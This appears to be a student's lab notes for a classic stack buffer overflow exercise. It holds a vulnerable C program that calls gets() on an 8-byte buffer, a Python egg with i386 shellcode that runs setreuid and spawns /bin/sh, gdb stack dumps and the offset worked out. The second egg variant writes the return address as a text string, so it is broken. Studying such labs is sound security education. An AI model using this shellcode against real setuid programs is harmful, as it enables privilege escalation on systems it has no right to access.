//Orbit.c
/*
#include <stdio.h>
void orbit()
{
  char buf[8];
  gets(buf);
}
int main()
{
  orbit();
  return 0;
}
*/

#!/usr/bin/env python

shellcode = \
"\x6a\x32\x58\xcd\x80\x89\xc3\x89\xc1\x6a" + \
"\x47\x58\xcd\x80\x31\xc0\x50\x68\x2f\x2f" + \
"\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50" + \
"\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"

print('A'*20+'\x60\xfb\xff\xbf'+shellcode)


//----------- MY EGG SOLUTION -----------

shellcode = \
"\x6a\x32\x58\xcd\x80\x89\xc3\x89\xc1\x6a" + \
"\x47\x58\xcd\x80\x31\xc0\x50\x68\x2f\x2f" + \
"\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50" + \
"\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
print('A' * 20 + "0xbffffb60" + shellcode)

returns
$ AAAAAAAAAAAAAAAAAAAA`???j2X̀?É?jGX̀1?Ph//shh/binT[PS??1Ұ
                                                                   ̀


/*
Create egg file: touch filename
Give egg permission:
chmod +rwx filename to add permissions.
chmod -rwx directoryname to remove permissions.
chmod +x filename to allow executable permissions.
chmod -wx filename to take out write and executable permissions.
------------------------------------------------------------------------
----- Q1 Stack Diagram -----
[4] RIP of main                                BUF ON ATTACK
[4] SFP of main                                BUF ON ATTACK
[n] compiler padding unknown bytes n
*now in orbit*
[4] RIP orbit(@ 0xbffffb5c, value @ 0x8049208) REASSIGN ON ATTACK
[4] SFP orbit(@ 0xbffffb68)                    GARBAGE ON ATTACK
[m] compiler padding unknown bytes m
[8] char buf (buffer)                          GARBAGE ON ATTACK
*breakpoint* won't actually go into gets func. from here
to find compiler padding open up in GDB,
use './debug-exploit' and 'layout split' (can scroll inside gbd)
set a breakpoint at line 5 'b 5' command
run using 'r'
look at stack type 'x/16x buf' , starts at buf, prints 16 bytes,
starting at buf going upwards
------------------------------------------------------------------------
i f for break @ 6
Stack level 0, frame at 0xbffffb60:
   eip = 0x80491eb in orbit (orbit.c:6); saved eip = 0x8049208
   called by frame at 0xbffffb70
   source language c.
   Arglist at 0xbffffb58, args:
   Locals at 0xbffffb58, Previous frame's sp is 0xbffffb60
   Saved registers:
     ebp at 0xbffffb58, eip at 0xbffffb5c

SFP is Saved EBP
RIP is Saved EIP
Value of EIP (so RIP as well) saved in address '0x08049208' (saved EIP)
EIP (so RIP as well) saved in register address '0xbffffb5c' (EIP/RIP at)
------------------------------------------------------------------------
----------- (gdb) x/32x gets -----------
0x804945f <gets>:       0xff315755      0x32e85356      0x81fffffc      0x002b7ec3
0x804946f <gets+16>:    0x1cec8300      0x0084838b      0xc0850000      0xec831478
0x804947f <gets+32>:    0x38838d0c      0x50000000      0x000337e8      0x10c48300
0x804948f <gets+48>:    0xf631c789      0x00382d8d      0x938d0000      0x00000038
0x804949f <gets+64>:    0x042b448b      0x082b443b      0x488d0c74      0x2b4c8901
0x80494af <gets+80>:    0x00b60f04      0xec8319eb      0x5489520c      0xb6e81c24
0x80494bf <gets+96>:    0x83000004      0x548b10c4      0xf8830c24      0x831074ff
0x80494cf <gets+112>:   0x0b740af8      0x30244c8b      0x31448846      0x8bc1ebff
-----------(gdb) x/32x buf (buf == 8bytes)-----------
0xbffffb48:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffb58:     0xbffffb68      0x08049208      0x00000001      0x080491fd
0xbffffb68:     0xbffffbec      0x080493d6      0x00000001      0xbffffbe4
0xbffffb78:     0xbffffbec      0x0804a000      0x00000000      0x00000000
0xbffffb88:     0x080493b4      0x0804bfe8      0x00000000      0x00000000
0xbffffb98:     0x00000000      0x08049097      0x080491fd      0x00000001
0xbffffba8:     0xbffffbe4      0x08049000      0x08049d39      0x00000000
0xbffffbb8:     0x00000000      0x00000000      0x00000000      0x0804906b
So...
first two '0x00000000' are the buf, [8 bytes] (4 each)
second two '0x00000000' are compiler padding, m probably ~ 8 bytes
'0xbffffb68' is the SFP [4  bytes]
'0x08049208' is the RIP [4 bytes]
So, we will need to print 5 garbage words for 0x00000000 - 0xbffffb68,
each having 4 bytes each, so 5 * 4 = 20
RIP(eip) = @ 0xbffffb5c from info frame
add 4, @ 0xbffffb5c + 4 = @ 0xbffffb60 (same as Stack level frame in info frame)
*/
